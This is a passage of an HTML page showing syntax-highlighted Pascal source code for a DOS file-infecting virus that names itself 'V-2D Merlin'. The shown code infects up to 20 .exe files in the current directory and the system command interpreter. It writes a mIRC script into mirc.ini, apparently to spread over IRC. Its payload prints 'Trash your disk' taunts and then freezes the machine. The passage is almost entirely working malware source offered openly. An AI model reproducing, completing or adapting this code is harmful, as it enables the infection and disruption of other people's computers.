                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">filesize</span><span class="sc10">(</span><span class="sc11">ff</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">186</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc0"> </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">ff</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">
                  </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">ff</span><span class="sc10">);</span><span class="sc0">
                  </span><span class="sc11">rewrite</span><span class="sc10">(</span><span class="sc11">ff</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
                  </span><span class="sc11">BlockWrite</span><span class="sc10">(</span><span class="sc11">ff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">scrypt1</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">length</span><span class="sc10">(</span><span class="sc11">scrypt1</span><span class="sc10">));</span><span class="sc0">
                  </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">ff</span><span class="sc10">);</span><span class="sc0">
                  </span><span class="sc11">Seek</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">filesize</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">));</span><span class="sc0">
                  </span><span class="sc11">BlockWrite</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">scrypt2</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">length</span><span class="sc10">(</span><span class="sc11">scrypt2</span><span class="sc10">));</span><span class="sc0">                     
               </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">
     
</span><span class="sc5">begin</span><span class="sc0">
     </span><span class="sc11">randomize</span><span class="sc10">;</span><span class="sc0"> 
     </span><span class="sc11">r.ds</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">seg</span><span class="sc10">(</span><span class="sc11">vir</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc11">r.si</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">ofs</span><span class="sc10">(</span><span class="sc11">vir</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc11">intr</span><span class="sc10">(</span><span class="sc4">$91</span><span class="sc10">,</span><span class="sc11">r</span><span class="sc10">);</span><span class="sc0"> 
     </span><span class="sc1">{ make mIRC scrypt }</span><span class="sc0">
     </span><span class="sc11">assign</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">,</span><span class="sc7">'c:\mirc\mirc.ini'</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc9">{$I-}</span><span class="sc0"> </span><span class="sc11">reset</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc9">{$I+}</span><span class="sc0"> 
     </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">ioresult</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc11">make_mirc</span><span class="sc10">(</span><span class="sc7">'c:\'</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc5">else</span><span class="sc0">
       </span><span class="sc5">begin</span><span class="sc0">
           </span><span class="sc11">assign</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">,</span><span class="sc7">'c:\progra~1\mirc\mirc.ini'</span><span class="sc10">);</span><span class="sc0">
           </span><span class="sc9">{$I-}</span><span class="sc0"> </span><span class="sc11">reset</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc9">{$I+}</span><span class="sc0">    
           </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">ioresult</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc11">make_mirc</span><span class="sc10">(</span><span class="sc7">'c:\progra~1\'</span><span class="sc10">);</span><span class="sc0">
       </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">  
     </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">PortW</span><span class="sc10">[</span><span class="sc4">$40</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">666</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0">
        </span><span class="sc5">begin</span><span class="sc0">
           </span><span class="sc11">demos</span><span class="sc10">;</span><span class="sc0">
           </span><span class="sc11">Writeln</span><span class="sc10">(</span><span class="sc7">'V-2D Merlin'</span><span class="sc10">);</span><span class="sc0">
           </span><span class="sc11">Writeln</span><span class="sc10">;</span><span class="sc0">
           </span><span class="sc11">Writeln</span><span class="sc10">(</span><span class="sc7">'Now you die!'</span><span class="sc10">);</span><span class="sc0">
           </span><span class="sc11">Writeln</span><span class="sc10">;</span><span class="sc0">
           </span><span class="sc5">Write</span><span class="sc10">(</span><span class="sc7">'Trash your disk '</span><span class="sc10">);</span><span class="sc0">
           </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc11">w</span><span class="sc10">:=</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc4">20</span><span class="sc0"> </span><span class="sc5">do</span><span class="sc0">
               </span><span class="sc5">begin</span><span class="sc0">
                   </span><span class="sc5">write</span><span class="sc10">(</span><span class="sc7">'.'</span><span class="sc10">);</span><span class="sc0">
                   </span><span class="sc11">timer</span><span class="sc10">(</span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0"> 
               </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">Writeln</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">Writeln</span><span class="sc10">(</span><span class="sc7">'Now you disk is fucked!!!!'</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">asm</span><span class="sc14">
               </span><span class="sc1">{ Hang up }</span><span class="sc14">
               cli
            @0:
               jmp @0  
            </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">    
        </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0"> 
     </span><span class="sc11">assign</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">test_write</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc9">{$i-}</span><span class="sc0"> </span><span class="sc11">rewrite</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc9">{$i+}</span><span class="sc0">
     </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">IOResult</span><span class="sc0"> </span><span class="sc10">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc11">Halt</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc11">erase</span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc11">FindFirst</span><span class="sc10">(</span><span class="sc7">'*.exe'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Archive</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DirInfo</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc11">w</span><span class="sc10">:=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> 
     </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc11">DosError</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc5">do</span><span class="sc0">
     </span><span class="sc5">begin</span><span class="sc0">
        </span><span class="sc11">Inc</span><span class="sc10">(</span><span class="sc11">w</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc11">w</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">20</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc11">Break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">Infect</span><span class="sc10">(</span><span class="sc11">DirInfo.Name</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">FindNext</span><span class="sc10">(</span><span class="sc11">DirInfo</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">infect</span><span class="sc10">(</span><span class="sc11">GetEnv</span><span class="sc10">(</span><span class="sc7">'COMSPEC'</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc5">end.</span><span class="sc0">
</span></div></body>
</html>
